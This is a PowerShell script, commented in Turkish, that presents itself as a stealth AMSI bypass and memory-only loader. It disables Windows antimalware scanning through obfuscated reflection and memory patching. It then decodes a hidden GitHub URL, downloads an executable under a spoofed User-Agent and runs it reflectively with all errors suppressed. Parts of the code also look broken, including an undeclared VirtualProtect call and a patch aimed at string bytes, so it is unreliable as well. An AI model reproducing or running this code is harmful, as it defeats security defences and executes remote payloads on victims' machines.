# =============================================================================
# 2026 Stealth AMSI Bypass + Reflective EXE Loader (Disksiz - RAM only)
# Unicode obfuscation + AmsiScanBuffer string replace fallback
# =============================================================================

${ErrorActionPreference} = 'SilentlyContinue'

# ── Unicode normalization obfuscated reflection bypass (çok düşük tespit) ──
${_} = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'+'.'+'A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s'
${__} = [Ref].Assembly.GetType(${_})

if(${__}){
    ${f} = ${__}.GetField(
        'a'+'m'+'s'+'i'+'I'+'n'+'i'+'t'+'F'+'a'+'i'+'l'+'e'+'d',
        'N'+'o'+'n'+'P'+'u'+'b'+'l'+'i'+'c'+','+'S'+'t'+'a'+'t'+'i'+'c'
    )
    if(${f}){ ${f}.SetValue(${null}, ${true}) }
}

# Alternatif: Unicode normalized (FormD → Mn kaldır) versiyon
try{
    ${n} = 'Sẏstëm.Mänägëmënt.Äutömätiön.ÄmsiÜtils' -replace '\p{Mn}'
    ${t} = [Ref].Assembly.GetType(${n})
    ${t}.GetField('ämsiÏnïtFäïlëd' -replace '\p{Mn}','NonPublic,Static').SetValue(${null},${true})
}catch{}

# ── Fallback: CLR'de AmsiScanBuffer string replace (behavioral düşük risk) ──
try{
    ${s} = 'AmsiScanBuffer'
    ${p} = [Text.Encoding]::UTF8.GetBytes(${s})
    ${r} = [byte[]](0xC3)  # RET → fonksiyon hemen dönsün

    ${h} = [Diagnostics.Process]::GetCurrentProcess().Handle
    ${addr} = [IntPtr]::Zero
    ${mbi} = New-Object PSObject -Property @{BaseAddress=0;RegionSize=0;Protect=0;State=0}

    Add-Type -MemberDefinition @"
        [DllImport("kernel32")] public static extern bool VirtualQuery(IntPtr a, out IntPtr b, uint c);
        [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint r);
        [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint r);
"@ -Name W -Namespace N -PassThru | Out-Null

    while(${true}){
        ${sz} = [Runtime.InteropServices.Marshal]::SizeOf(${mbi})
        if(-not [N.W]::VirtualQuery(${addr}, [ref]${mbi}, ${sz})){break}

        if(${mbi}.State -eq 0x1000 -and ${mbi}.RegionSize -gt ${p}.Length){
            ${buf} = New-Object byte[] ${mbi}.RegionSize
            ${rd} = 0
            [N.W]::ReadProcessMemory(${h}, ${mbi}.BaseAddress, ${buf}, ${buf}.Length, [ref]${rd})

            for(${i}=0; ${i} -lt (${rd} - ${p}.Length); ${i}++){
                ${m}=${true}
                for(${j}=0; ${j} -lt ${p}.Length; ${j}++){
                    if(${buf}[${i}+${j}] -ne ${p}[${j}]){${m}=${false};break}
                }
                if(${m}){
                    ${tgt} = [IntPtr](${mbi}.BaseAddress.ToInt64() + ${i})
                    ${op}=0
                    [N.W]::VirtualProtect(${tgt}, 1, 0x40, [ref]${op})  # PAGE_EXECUTE_READWRITE
                    [N.W]::WriteProcessMemory(${h}, ${tgt}, ${r}, 1, [ref]${null})
                    [N.W]::VirtualProtect(${tgt}, 1, ${op}, [ref]${null})
                    break
                }
            }
        }
        ${addr} = [IntPtr](${mbi}.BaseAddress.ToInt64() + ${mbi}.RegionSize.ToInt64())
    }
}catch{}

# ── Payload (WebClient + UA spoof) ──
try{
    ${u} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2VmZWNhbjE4ODFiLW1ha2VyLzIyLjAxLjIwMjYvcmF3L3JlZnMvaGVhZHMvbWFpbi81LjZNb2NrYS5leGU='))

    ${wc} = New-Object Net.WebClient
    ${wc}.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

    ${b} = ${wc}.DownloadData(${u})
    ${a} = [Reflection.Assembly]::Load(${b})
    ${e} = ${a}.EntryPoint

    if(${e}){
        ${pa} = ${e}.GetParameters()
        ${ar} = @($null) * ${pa}.Count
        for(${i}=0; ${i}-lt ${pa}.Count; ${i}++){
            if(${pa}[${i}].ParameterType -eq [string[]]){${ar}[${i}]=@()}
        }
        ${e}.Invoke(${null}, ${ar})
    }
}catch{}